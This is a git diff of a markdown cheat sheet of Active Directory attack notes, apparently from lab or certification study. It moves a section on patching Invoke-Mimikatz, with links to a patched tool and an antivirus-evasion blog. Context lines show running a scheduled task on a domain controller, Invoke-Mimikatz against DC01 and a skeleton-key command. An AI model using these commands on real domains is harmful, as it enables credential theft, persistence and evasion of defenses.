@@ -284,6 +284,16 @@ schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
 
 
 # Invoke Mimikatz
+
+#### Patch script if VirtualAlloc Error
+Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 
+
+https://github.com/mitre/caldera/issues/38#issuecomment-396055260
+
+https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/
+
+* * *
+
 ```. ./Invoke-Mimikatz.ps1```
 
 ```Invoke-Mimikatz -ComputerName DC01```
@@ -324,12 +334,7 @@ misc::skeleton
 
 * * *
 
-#### Patch script if VirtualAlloc Error
-Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 
 
-https://github.com/mitre/caldera/issues/38#issuecomment-396055260
-
-https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/
 
 # Rights Abuse - ACLs
 #### AdminSDHolder 
